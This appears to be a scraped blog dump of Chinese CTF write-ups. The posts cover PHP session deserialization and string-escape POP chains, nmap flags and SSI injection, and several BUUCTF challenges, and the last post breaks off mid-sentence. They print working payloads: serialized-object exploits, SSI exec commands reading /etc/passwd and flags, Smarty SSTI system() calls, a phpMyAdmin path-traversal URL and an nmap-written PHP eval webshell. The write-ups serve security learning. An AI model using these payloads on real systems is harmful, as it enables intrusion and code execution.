发现自己的反序列化特别是pop链是真的不行，因此接下来要恶补下这一块，这次也是因为做题碰到了session反序列化所以来学习一波。","text":"前言 发现自己的反序列化特别是pop链是真的不行，因此接下来要恶补下这一块，这次也是因为做题碰到了session反序列化所以来学习一波。 Session反序列化了解php.ini中的Session设置 session.save_path=”” –设置session的存储路径 session.save_handler=””–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动 session.serialize_handler string–定义用来序列化/反序列化的处理器名字，默认使用php Session反序列化漏洞的出现由于处理器对反序列化的处理方式不同，导致了序列化的储存格式的不同： 12345678php:键名|经过serialize()序列化的值例如：mrl64|s:6:&quot;hacker&quot;;php_binary:键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值例如：mrl64s:6:&quot;hacker&quot;;php_serialize:经过serialize()函数序列化处理的值例如：a:1:&#123;s:5:&quot;mrl64&quot;;s:6:&quot;hacker&quot;;&#125; 而如果程序使用两个引擎来分批处理session数列化结构的话，就会导致数据无法正确反序列化，导致可以构造payload绕过一些验证。 比如我们先存入session变量： 1234&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;mrl64&#x27;] = &#x27;|O:6:&quot;hacker&quot;:1:&#123;s:4:&quot;hack&quot;;s:3:&quot;lol&quot;;&#125;&#x27;; 在Session文件中的内容： 1a:1:&#123;s:5:&quot;mrl64&quot;;s:39:&quot;|O:6:&quot;hacker&quot;:1:&#123;s:4:&quot;hack&quot;;s:3:&quot;lol&quot;;&#125; 这时候我们模拟读取，但是用不同的处理器进行处理： 123456789&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class hacker&#123; var $hack; function __wakeup() &#123; echo $this-&gt;hack; &#125;&#125; 这时候我们发现会显的是lol，说明__wakeup()魔术方法被触发了，这是由于php处理器会将|前的内容作为键名。 【GCTF2017】PHP序列化审计index.php: 1234567891011121314151617181920212223242526&lt;?php//error_reporting(E_ERROR &amp; ~E_NOTICE);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);header(&quot;content-type;text/html;charset=utf-8&quot;);session_start();if(isset($_GET[&#x27;src&#x27;]))&#123; $_SESSION[&#x27;src&#x27;] = $_GET[&#x27;src&#x27;]; highlight_file(__FILE__); print_r($_SESSION[&#x27;src&#x27;]);&#125;?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;代码审计2&lt;/title&gt; &lt;/head&gt; &lt;body&gt; 在php中，经常会使用序列化操作来存取数据，但是在序列化的过程中如果处理不当会带来一些安全隐患。&lt;form action=&quot;./query.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;ticket&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;a href=&quot;./?src=1&quot;&gt;查看源码&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 接着根据提示访问query.php~读取源码： 1234567891011121314151617181920212223242526272829303132333435363738394041session_start();header(&#x27;Look me: edit by vim ~0~&#x27;)//......class TOPA&#123; public $token; public $ticket; public $username; public $password; function login()&#123; //if($this-&gt;username == $USERNAME &amp;&amp; $this-&gt;password == $PASSWORD)&#123; //抱歉 $this-&gt;username ==&#x27;aaaaaaaaaaaaaaaaa&#x27; &amp;&amp; $this-&gt;password == &#x27;bbbbbbbbbbbbbbbbbb&#x27;)&#123; return &#x27;key is:&#123;&#x27;.$this-&gt;token.&#x27;&#125;&#x27;; &#125; &#125;&#125;class TOPB&#123; public $obj; public $attr; function __construct()&#123; $this-&gt;attr = null; $this-&gt;obj = null; &#125; function __toString()&#123; $this-&gt;obj = unserialize($this-&gt;attr); $this-&gt;obj-&gt;token = $FLAG; if($this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket)&#123; return (string)$this-&gt;obj; &#125; &#125;&#125;class TOPC&#123; public $obj; public $attr; function __wakeup()&#123; $this-&gt;attr = null; $this-&gt;obj = null; &#125; function __destruct()&#123; echo $this-&gt;attr; &#125;&#125; 我们发现在index.php中进行了ini_set()，而query.php却没有，因此是默认php处理器，符合session反序列化的前置。 接着观察源码，发现只有TOPC中存在echo，而要让attr能够输出内容需要绕过TOPC中的__wakeup()魔术方法。接着发现TOPB的__toString()魔术方法中存在&amp;FLAG的赋值以及反序列化函数，因此我们要将attr赋值为TOPB对象从而触发这个魔术方法。而if的判断语句中需要$this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket，这里要建立引用关系$a-&gt;ticket = &amp;$a-&gt;token;来绕过判断。而要用到ticket与token则必须调用TOPA类，而要调用TOPA类就必须绕过if判断，但是由于这里是个弱比较，因此我们让username=password=0就可以了，0若等于字符串。 逻辑理完，构建exp： 1234567891011$A = new TOPA();$B = new TOPB();$C = new TOPC();$A -&gt; username = 0$A -&gt; password = 0$A -&gt; ticket = &amp;$A-&gt;token;$s = serialize($A);$C -&gt; attr = $B;$B -&gt; attr = $s;$flag = serialize($C);echo $flag; 最后记得要绕过wakeup，并且加上|，payload: 1|O:4:&quot;TOPC&quot;:3:&#123;s:3:&quot;obj&quot;;N;s:4:&quot;attr&quot;;O:4:&quot;TOPB&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:4:&quot;attr&quot;;s:84:&quot;O:4:&quot;TOPA&quot;:4:&#123;s:5:&quot;token&quot;;N;s:6:&quot;ticket&quot;;R:2;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;&quot;;&#125;&#125; 无$_SESSION变量的赋值上面的题目中是存在$_SESSION[&#39;src&#39;]进行赋值的，但是在有些题目中是没有的，这时候就要运用到php利用session上传进度了。 详细可以参考php手册：Session上传进度 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。通常这些键值可以通过读取INI设置来获得 简单说来，就是我们要构建一个表单，同时POST一个与session.upload_process.name同名的变量，后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中，下次请求就会反序列化Session。 那么我们构建如下表单： 12345&lt;form action=&quot;http://xx.xx.xx.xx&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 【Jarvis OJ】PHPINFO说那么多还是直接看题吧，查看源码： 12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt; 比起pop链这种看起来就简单清晰多了，当我们随便输入一个值是就会触发__construct()魔术方法，执行phpinfo。查看页面发现存在之前提到的那个问题，因此依然是Session反序列化。 而这个反序列化的逻辑也是十分简单的，相当于就是执行mdzz的语句，因此我们将phpinfo();替换为print_r(scandir(dirname(__FILE__)));，执行序列化，得到payload，记得要加上|，用反斜杠防止转义： 1|O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;&#125; 然后将之前那个表单保存为html格式，随便上传一个文件，然后抓包将文件内容改为payload，然后看到flag文件，去phpinfo中的SCRIPT_FILENAME部分查看包含当前运行脚本的路径，然后用file_get_contents()读取就可以了。 反序列化的字符串逃逸反序列化基本知识在理解字符串逃逸之前，我们必须对反序列化有一个前置知识的了解，不过这些内容是比较简单的，因此就大致说一下。 第一，php反序列化以;&#125;为结尾，并且根据长度判断内容。 比如我们构造这样一个序列化内容进行反序列化： 1O:6:&quot;hacker&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;s:5:&quot;pass2&quot;;s:6:&quot;123457&quot; 反序列化出的内容： 12345678class __PHP_Incomplete_Class#1 (3) &#123; public $__PHP_Incomplete_Class_Name =&gt; string(6) &quot;hacker&quot; public $name =&gt; string(5) &quot;mrl64&quot; public $pass =&gt; string(6) &quot;123456&quot;&#125; 可以看出结束后面部分的内容是不会读取的，因此我们可以提前闭合序列化内容使后面的部分丢弃。 第二，长度不对应会返回bool(false) 这个就比较好理解了，也是为什么反复强调要对应长度，我们将下面这个payload进行反序列化： 1O:6:&quot;hacker&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:7:&quot;123456&quot;;&#125; 返回bool(false) 第三，相当重要的一点，反序列化可以反序列类中不存在的元素 例如我们的类是这样的： 1234class hacker&#123; public $name=&#x27;mrl64&#x27;; public $pass=&#x27;123456&#x27;;&#125; 但是我们可以构建如下的payload： 1O:6:&quot;hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;s:3:&quot;age&quot;;s:4:&quot;2333&quot;;&#125; 将其反序列化可以发现，age依然成功反序列化出来了： 12345678910class __PHP_Incomplete_Class#1 (4) &#123; public $__PHP_Incomplete_Class_Name =&gt; string(6) &quot;hacker&quot; public $name =&gt; string(5) &quot;mrl64&quot; public $pass =&gt; string(6) &quot;123456&quot; public $age =&gt; string(4) &quot;2333&quot;&#125; 有了这些知识，我们就可以开始构造字符串逃逸相关的payload了。 如何构建字符串逃逸首先我们要明白一点，字符串逃逸的本质就是改变序列化的长度，无论是变长还是变短，最终的被目的就是为了绕过一些waf。 核心其实都是一样的，通过题目漏洞构建payload使一些部分由于序列化的长度被识别为键名，从而进行绕过。这样说比较抽象，接下来我们用一道题认识改变字符串长度导致的的字符串逃逸。 [0CTF 2016]piapiapia进入网页啥也没发现，测试了下登录框也不存在sql、ssti等注入，因此扫描目录，发现www.zip，下载。 这个代码审计量有点大，首先是注册和登录，这个比较简单，基本没啥限制，因此先注册登录一个账号。接着是config.php，发现flag内容存在这个文件里面，因此要想办法读取。 接着就是三个重点文件了，首先是登录成功后的update.php： 1234567891011121314151617181920212223242526272829303132&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt; 匹配是否都有传值，并且对传入的值都进行了严格的正则匹配与长度限制，最后对我们传入的文件内容进行序列化。而我们发现这个php文件包含了class.php，继续审计： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&lt;?phprequire(&#x27;config.php&#x27;);class user extends mysql&#123; private $table = &#x27;users&#x27;; public function is_exists($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;;an return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config[&#x27;hostname&#x27;], $config[&#x27;username&#x27;], $config[&#x27;password&#x27;] ); mysql_select_db($config[&#x27;database&#x27;]); mysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(&#x27;,&#x27;, $key_list); $value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new user();$user-&gt;connect($config); 好长的类，一大堆函数，但是我们注意到filter中将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’全部替换成了’hacker’，这个点之后可以用来利用。 最后是存在反序列化的profile.php文件： 1234567891011121314151617&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt; 最后这个文件就是读取了，用base64编码对上传文件进行了读取和显示。看完代码，我们知道我们要读取config.php中的flag数据。而读取数据的位置在photo那里，因此我们需要增加payload的长度使得config.php的位置被挤到photo的位置上。 首先构建序列化： 1234567&lt;?php$profile[&#x27;phone&#x27;]=&#x27;12312312312&#x27;;$profile[&#x27;email&#x27;]=&#x27;mrl64@163.com&#x27;;$profile[&#x27;nickname&#x27;]=[&#x27;halo&#x27;]; //数组绕过长度限制$profile[&#x27;photo&#x27;]=&#x27;config.php&#x27;;echo serialize($profile);?&gt; payload： 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312312&quot;;s:5:&quot;email&quot;;s:13:&quot;mrl64@163.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;halo&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; PHP在反序列化时，从左往右读取数据类型及长度，且只读取其中规定长度的数据，即当数据的长度大于规定的长度，后面还有数据也不再读取，而后面不再读取的数据，就会被挤到下一个数据项中。 这里需要构造超出长度的数据，将被挤出来的数据形成可以读取config.php 的数据项。首先最后一个部分的payload: 1&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 总共有34个字符，我们要让这些字符逃逸出来，就必须让nickname部分多出34个字符，这样我们最后部分的payload被读进nickname，既然从nickname逃逸出&quot;;&#125;，将前面的nickname数组闭合之后，剩下的s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;就会被当作photo的部分了。 我们发现where会被替换成hacker，因此每替换一次就会使长度增加一位，34个where就会增加34位。最后payload，将nickname类型改为数组并将内容改为payload： 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 过程如下： 刚开始传入:1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312312&quot;;s:5:&quot;email&quot;;s:13:&quot;mrl64@163.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/07cc694b9b3fc636710fa08b6922c42b&quot;;&#125; 此时&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;这些部分都是nickname的一部分 接着进行正则替换后，where被替换为hacker，导致再读取完第34个hacker之后就停止读取了，而s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;就替代了原来upload的地位，就是photo部分，而由于最后的&quot;;&#125;，导致反序列化提前结束，原来的upload不被执行。 上传，然后抓包，把nickname改为数组绕过，解base64得到flag。 总结最近应该是死磕反序列化这一块了，先把欢乐新春赛那题写了，接着重点刷pop，并且学习原生类应用。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"nmap的使用及ssi注入","slug":"nmap的使用及ssi注入","date":"2022-02-25T07:07:43.000Z","updated":"2022-02-25T12:09:49.368Z","comments":true,"path":"2022/02/25/nmap的使用及ssi注入/","link":"","permalink":"http://example.com/2022/02/25/nmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%8F%8Assi%E6%B3%A8%E5%85%A5/","excerpt":"前言 昨天挖的坑今天就填，顺便也记录下nmap的使用从，毕竟ssi有时候也要搭配nmap扫描的。","text":"前言 昨天挖的坑今天就填，顺便也记录下nmap的使用从，毕竟ssi有时候也要搭配nmap扫描的。 Nmap使用Nmap作为一个强大的主机扫描工具，在检测主机、端口等方面有着相当强大的功能。这里记录下常用的指令，在正式使用时为了绕过往往需要多条指令联合使用。 详细使用方法可以参考下面几篇博客：扫描工具——Nmap用法详解Nmap的使用方法总结 主机发现 -sL：列表扫描，仅列举制定目标的IP，不进行主机发现 -sn：进行主机发现，不进行端口扫描 -n/-R：不进行/进行DNS解析 -Pn：非ping扫描，不进行主机发现，常用来绕过防火墙 –traceroute：追踪每个路由节点 -PA/-PS/-PU/-PY：使用TCP ACK/SYN/或SCTP INIT/ECHO方式来发现主机 -sP：扫描一个段的主机在线状况 -O：操作系统检测 端口扫描 -sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描。 -sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。 -sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。 -p：自定义端口扫描，可以指定端口范围或指定端口 -sV/-vv：探测打开端口对应服务的版本信息/详细输出扫描结果，包含开放端口，扫描方法，端口对应服务协议等 -A：万能开关扫描，包含了1-10000端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测 SSI注入什么是ssiSSI(Server-Side Includes Injection)，即服务端包含注入。SSI注入允许远程在 Web 应用中注入脚本来执行代码。 SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。 ssi语法 显示服务器端环境变量&lt;#echo&gt; 12&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt; //显示IP&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt; //显示本文档名称 将文本内容直接插入到文档中&lt;#include&gt; 123&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;file包含文件可以在同一级目录或其子目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径 直接执行服务器上的各种程序&lt;#exec&gt; 12&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt; ssi探测如果在网站目录中发现了.stm，.shtm，.shtml，并且网站对于ssi的输入没有做到严格过滤，很有可能被ssi注入攻击。这时获取信息一般要会用到nmap以及dirb。 还可以从业务场景来判断，如果有获取IP、定位、时间等等都可能是用ssi实现的，这时可能会存在ssi注入。 总结其实这篇博客挺水的，因为本来ssi也基本很少考到，因此就连着nmap也一起写了。明天考核加油。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -nmap -ssi","slug":"web-nmap-ssi","permalink":"http://example.com/tags/web-nmap-ssi/"}]},{"title":"buu练习3","slug":"buu练习3","date":"2022-02-24T09:47:55.000Z","updated":"2022-02-24T13:16:22.112Z","comments":true,"path":"2022/02/24/buu练习3/","link":"","permalink":"http://example.com/2022/02/24/buu%E7%BB%83%E4%B9%A03/","excerpt":"前言 虽然要考核了，但是还是要准备接下来的比赛，而且不是很想看反序列化，所以就继续刷题拓宽知识面了。","text":"前言 虽然要考核了，但是还是要准备接下来的比赛，而且不是很想看反序列化，所以就继续刷题拓宽知识面了。 [BJDCTF2020]Mark loves cat进入网页没有什么能注入的地方，怀疑信息搜集，扫描目录发现存在git源码泄露，用GitHack提取，查看源码：flag.php： 12&lt;?php$flag = file_get_contents(&#x27;/flag&#x27;); index.php： 123456789101112131415161718192021222324252627282930&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; exit($handsome); &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125;echo &quot;the flag is: &quot;.$flag; 分析源码，首先看到foreach()函数，这个函数的作用是遍历数组： foreach (iterable_expression as $key =&gt; $value) statement遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的键名被赋给变量 $key，当前单元的值被赋给 $value。 因此我们可以利用这个函数来改变定义的三个变量的值，然后构建exit($flag)读取flag，或者我们绕过所有的判断语句并且不改变flag的值也可以读取到flag。 因此这里就要用到变量覆盖的原理了，这里直接给出最后payload并进行分析。 payload1： 1?yds=flag 首先我们没有GET进flag，因此绕过了第一和第三个判断，但是由于我们没有传入flag，因此要执行第二个判断中的语句，返回$yds。但是我们GET传入根据会执行$$x = $$y，即$yds=$flag。而$flag的值没有改变，因此可以得到flag。 payload2： 1?is=flag&amp;flag=flag GET传入flag=flag，这样就没有改变flag的值，而且会触发第三个判断语句，返回$is，因此再把$is赋值flag就可以了。 [BJDCTF2020]EasySearch上来就是登录框，根据题目猜想含有信息搜集，测试发现存在index.php.swp，进入查看源码： 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; ) &#123; $admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;; &#125;else &#123; *** &#125; ***?&gt; 我们得知我们输入的password进行md5加密后的前6位应该为6d0bc1，写python脚本爆破： 12345678import hashlibfor i in range(1000000000): a = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest() if a[0:6] == &#x27;6d0bc1&#x27;: print(i) print(a) 进入后发现请求头中藏这个url，访问后进入新页面： 1public/fdf1c9d4a791f1e565a71524bfffac7b4875a60e.shtml 搜索资料后发现这里要用到ssi，因此在username那里写入payload： 12&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt; 获取flag。继续挖坑，ssi的博客之后会写的。 [CISCN2019 华东南赛区]Web11看页面最后告诉我们Build With Smarty !，不难猜出是一道ssti。但是这个注入点看了好久才看出来，根据网页上get IP，get XFF，提示注入点在头文件中的XFF中。 而Smarty ssti的注入可以用&#123;&#125;直接执行命令，也可以使用标签。我这里使用标签构建payload： 12X-Forwarded-For: &#123;if system(&#x27;ls ../../../&#x27;)&#125;&#123;/if&#125;X-Forwarded-For: &#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; [GWCTF 2019]我有一个数据库进网页啥也没有，扫目录发现/phpmyadmin，进入后发现是数据库后台。 发现phpmyadmin版本为4.8.1，搜寻后发现CVE-2018-12613漏洞，直接用这个漏洞构造payload就可以了： 1http://3ffc4981-eb9f-463d-84e3-ef1348d3b690.node4.buuoj.cn:81/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag [BUUCTF 2018]Online Tool审计源码： 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; 这题的关键是利用最后一句代码，用nmap写入shell，payload： 1?host=&#x27;&lt;?php @eval($_POST[&quot;mrl64&quot;]);?&gt; -oG 1.php &#x27; 蚁剑连接即可。 但是这题的payload构建的核心在于这个引号上，为什么这个引号要这样构建呢，主要问题出在escapeshellarg()与escapeshellcmd()这两个函数上。 escapeshellarg()的作用就是将单引号转义，并将转义后的单引号的前后两部分再用一个单引号括上例如：123’ ls —&gt; ‘123’&#39;‘ ls’ 